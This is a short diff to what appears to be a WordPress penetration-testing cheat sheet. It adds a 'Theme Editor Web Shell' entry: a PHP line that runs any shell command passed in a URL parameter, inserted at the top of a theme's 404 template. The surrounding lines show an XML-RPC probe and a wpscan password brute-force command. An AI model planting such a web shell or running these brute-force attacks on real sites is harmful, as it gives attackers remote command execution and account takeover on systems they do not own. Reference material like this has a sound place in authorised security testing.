@@ -1704,6 +1704,20 @@ $ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params>
 $ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url <URL>
 ```
 
+- Theme Editor Web Shell
+
+```
+<?php
+
+system($_GET['cmd']);
+
+/**
+ * The template for displaying 404 pages (not found)
+ *
+ * @link https://codex.wordpress.org/Creating_an_Error_404_Page
+<SNIP>
+```
+
 #25. - Sensitive Data Exposure
 -----------------------------------------
 
